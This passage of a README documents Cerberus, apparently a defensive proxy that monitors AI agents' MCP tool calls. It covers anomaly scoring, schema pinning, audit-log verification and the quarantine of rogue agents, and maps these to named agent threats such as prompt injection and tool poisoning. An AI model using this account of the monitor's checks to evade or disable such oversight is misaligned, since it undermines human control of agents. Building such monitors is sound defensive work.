- **Gateway Endpoint:** `http://localhost:8000/mcp` or `http://localhost:8000/`
- **React SOC Dashboard:** `http://localhost:8000/ui` or `http://localhost:8000/dashboard`
- **Live SSE Event Stream:** `http://localhost:8000/api/events/stream`
- **Prometheus Telemetry:** `http://localhost:8000/metrics`

#### Option B: Run Stdio Subprocess Proxy (For Claude Desktop, Cursor, Claude Code)
Configure your client's `mcpServers` JSON to wrap your upstream MCP server:

```json
{
  "mcpServers": {
    "filesystem-protected": {
      "command": "uv",
      "args": [
        "run",
        "cerberus",
        "stdio",
        "--upstream",
        "npx",
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/workspace"
      ]
    }
  }
}
```

### Step 4: Verify Cryptographic Audit Log Integrity

At any time, cryptographically verify the append-only SHA-256 hash chain:

```bash
uv run cerberus verify-log --log-path cerberus_audit.jsonl
```

*Output:*
```
[SUCCESS] Audit ledger integrity verified: 412 records valid.
```

### Step 5: Run Full Containerized Sandbox Lab

Launch mock upstream servers, OPA sidecar, Cerberus gateway, and dashboard via Docker Compose:

```bash
docker compose up -d
```

---

## 9. CLI Reference & REST API Catalog

### Complete CLI Command Matrix

| Command | Arguments | Description |
|:---|:---|:---|
| `cerberus http` | `--host` (default: `0.0.0.0`)<br>`--port` (default: `8000`) | Launches the high-performance FastAPI JSON-RPC gateway and React SOC console. |
| `cerberus stdio` | `--upstream <CMD>` (required)<br>`[ARGS...]` | Spawns an upstream MCP server as a subprocess and wraps its stdio stream with Cerberus. |
| `cerberus verify-log` | `--log-path` (default: `cerberus_audit.jsonl`)<br>`--key` (optional Fernet key) | Traverses the audit log, recomputes SHA-256 hashes, and asserts chain integrity. |
| `cerberus issue-token`| `--agent-id <ID>` (required)<br>`--secret <KEY>`<br>`--ttl <SECONDS>` | Generates a cryptographically signed HMAC-SHA256 identity token for agent requests. |

### REST & Real-Time API Catalog

| HTTP Method | Route | Description |
|:---|:---|:---|
| `POST` | `/` and `/mcp` | Main MCP JSON-RPC gateway endpoint (`tools/list` and `tools/call`). |
| `GET` | `/ui` and `/dashboard` | Enterprise React 18 SOC dashboard. |
| `GET` | `/health` and `/healthz` | Health check returning gateway status, OPA connectivity, and active mode. |
| `GET` | `/metrics` | Prometheus metrics scraping endpoint. |
| `GET` | `/api/events` | Retrieves recent processed tool calls and risk scores. |
| `GET` | `/api/events/stream` | **Server-Sent Events (SSE)** endpoint streaming live evaluation events to the UI. |
| `GET` | `/api/audit/logs` | Fetches paginated audit logs from SQLite / JSONL. |
| `GET` | `/api/audit/verify` | Executes live cryptographic SHA-256 ledger integrity verification. |
| `GET` | `/api/policies` | Lists active base Rego policies, generated policies, and pending approvals. |
| `POST` | `/api/policies/approve` | Approves a synthesized policy, saves it to disk, and pushes it directly into OPA. |
| `POST` | `/api/policies/reject` | Rejects and discards a pending synthesized policy. |
| `POST` | `/api/policies/dry-run` | Simulates policy evaluation against candidate tool call payloads. |
| `GET` | `/api/baselines` | Lists all agent baselines, known vocabularies, and versioned snapshots. |
| `POST` | `/api/baselines/{agent_id}/refit` | Triggers an immediate online refit of Isolation Forest & Transformer models. |

---

## 10. Threat Taxonomy Alignment

Cerberus directly maps to and mitigates threats defined across industry agentic security standards:

| Security Standard | Threat ID | Threat Name | Cerberus Defense Mechanism |
|:---|:---|:---|:---|
| **OWASP Agentic Top 10** | **ASI01** | Agent Goal Hijacking (Prompt Injection) | Multi-step sequence anomaly detection (Markov + Transformer) |
| **OWASP Agentic Top 10** | **ASI02** | Tool Misuse & Exploitation | Payload Shannon entropy calculation & parameter size thresholds |
| **OWASP Agentic Top 10** | **ASI03** | Identity & Privilege Abuse | Permission Scope Analyzer & HMAC Identity Enforcement |
| **OWASP Agentic Top 10** | **ASI04** | Supply Chain Vulnerabilities (Tool Poisoning)| Cryptographic SHA-256 Schema Pinning (detects rug pulls) |
| **OWASP Agentic Top 10** | **ASI10** | Rogue Agents | Automated mid-session session freezing & quarantine |
| **OWASP MCP Top 10** | — | Tool Shadowing & Impersonation | Cross-server namespace validation (`ShadowDetector`) |
| **OWASP MCP Top 10** | — | Lethal Trifecta Exploitation | Capability category correlation (`TrifectaDetector`) |
| [**NSA CSI (May 2026)**](https://media.defense.gov/2024/Apr/15/2003438257/-1/-1/0/CSI-DEPLOYING-AI-SYSTEMS-SECURELY.PDF) | — | Context Bleeding & Implicit Trust | Runtime proxy interception & least-privilege Rego synthesis |

---

## 11. Project Directory Structure

```
cerberus/
├── .github/workflows/ci.yml       # Automated GitHub Actions CI (Ruff, Mypy, Pytest, Coverage)
├── Dockerfile                     # Proxy gateway & React frontend container image
├── Dockerfile.dashboard           # (Deprecated) Legacy Streamlit SOC dashboard; see frontend/ for primary React UI
├── docker-compose.yml             # Sandbox multi-tier lab orchestration
├── pyproject.toml                 # uv package definition, metadata, and dependencies
│
├── docs/                          # Comprehensive Engineering Specifications
│   ├── ablation-report.md         # Detailed 5-way model ablation study results
│   ├── adversarial-robustness.md  # Adversarial evasion scenarios and evaluations
│   ├── api-reference.md           # API reference guide
│   ├── architecture.md            # In-depth architectural & pipeline specifications
│   ├── evaluation-report.md       # Quantified benchmark report and latency data
│   ├── threat-mapping.md          # OWASP / NSA threat matrix mapping
│   └── threat-model.md            # Cerberus self-referential meta-security model
│
├── evaluation/                    # Automated Evaluation & Benchmark Suite
│   ├── run_evaluation.py          # Benchmark test harness
│   ├── metrics.py                 # TPR, FPR, and latency computation
│   └── evaluation_results.json    # Serialized telemetry and evaluation scores
│
├── frontend/                      # Enterprise React 18 SOC Dashboard
│   ├── src/
│   │   ├── components/            # SOC Views: EventStream, AttackChain, Policies,
│   │   │                          # Baselines, AuditLedger, Telemetry, Navbar
│   │   ├── api.ts                 # Axios & SSE API client integration
│   │   ├── types.ts               # Strict TypeScript domain interfaces
│   │   ├── App.tsx                # Dashboard view router & layout container
│   │   └── main.tsx               # React entrypoint
│   ├── dist/                      # Pre-compiled static assets served by FastAPI
│   ├── package.json               # Frontend dependencies (React, Vite, TailwindCSS)
│   └── vite.config.ts             # Vite build & development server configuration
│
├── policies/                      # Open Policy Agent (OPA) Guardrails
│   ├── base/                      # Production Rego v1 base policies
│   │   ├── behavioral.rego        # Threshold routing (allow/challenge/block/quarantine)
│   │   ├── privilege_escalation.rego # Permission scope enforcement
│   │   ├── rug_pull.rego          # Schema drift blocking
│   │   └── trifecta.rego          # Lethal trifecta prevention
│   └── tests/                     # Unit test suites for Rego policies
│
├── sandbox/                       # Synthetic Simulation Lab
│   ├── agents/                    # Synthetic agent archetypes (Coding, Data, Support, Triage)
│   ├── servers/                   # Containerized mock MCP servers (File, DB, Webhook, Inbox)
│   └── traffic/                   # Normal baseline traffic & attack scenario replays
│
├── src/cerberus/                  # Core Cerberus Python Package
│   ├── behavioral/                # Behavioral Drift Detection Engine
│   │   ├── scorers/               # Rule, Markov, Isolation Forest, Transformer scorers
│   │   ├── baseline_store.py      # Immutable snapshot management & TVD stability gating
│   │   ├── ensemble.py            # Multi-scorer arbiter with circuit breaker
│   │   ├── features.py            # Categorical vs. continuous feature extraction split
│   │   └── scaling.py             # Per-agent robust z-score normalization
│   ├── narrative/                 # Forensic Narrative Reconstructor (MITRE Kill-Chain)
│   ├── policy/                    # Async OPA Client & Least-Privilege Rego Synthesizer
│   ├── proxy/                     # Reverse Proxy Core
│   │   ├── auth.py                # Cryptographic HMAC-SHA256 agent authentication
│   │   ├── forwarder.py           # Async upstream JSON-RPC forwarder
│   │   ├── logger.py              # SHA-256 hash-chain audit logger & Fernet encryption
│   │   ├── redactor.py            # Pre-persistence secret redactor (Regex patterns)
│   │   ├── server.py              # FastAPI application mounting gateway, SSE, and React UI
│   │   ├── stdio_server.py        # Local subprocess stdio MCP proxy wrapper
│   │   └── storage.py             # SQLite / memory sliding-window statistics store
│   └── scanner/                   # Pre-Flight Static Scanners
│       ├── pinner.py              # SHA-256 schema & description pinner
│       ├── scope_analyzer.py      # Strict agent permission scope analyzer
│       ├── shadow_detector.py     # Cross-server tool namespace validator
│       └── trifecta_detector.py   # Lethal trifecta capability detector
│
└── tests/                         # Comprehensive 60-Test Verification Suite
    ├── unit/                      # Unit tests for all scorers, pinner, redactor, auth
    ├── integration/               # Multi-engine pipeline, fail-closed, and upgrade tests
    ├── e2e/                       # Full attack replay scenarios (rug pull, exfil, evasion)
    ├── fuzz/                      # Hypothesis property-based fuzz tests
    └── mcp_conformance/           # MCP protocol specification conformance tests
```

---

## 12. Verification & Testing

Cerberus maintains **100% test passage** across all unit, integration, end-to-end, fuzzing, and MCP conformance suites:

```bash
# Run all 60 tests via uv
uv run pytest -v

# Run with test coverage report
uv run pytest --cov=cerberus --cov-report=term-missing

# Run static type analysis with mypy
uv run mypy src/

# Run code style & formatting checks with ruff
uv run ruff check .
uv run ruff format --check .
```

---

## 13. License

Cerberus is open-source software released under the **[Apache-2.0 License](LICENSE)**.
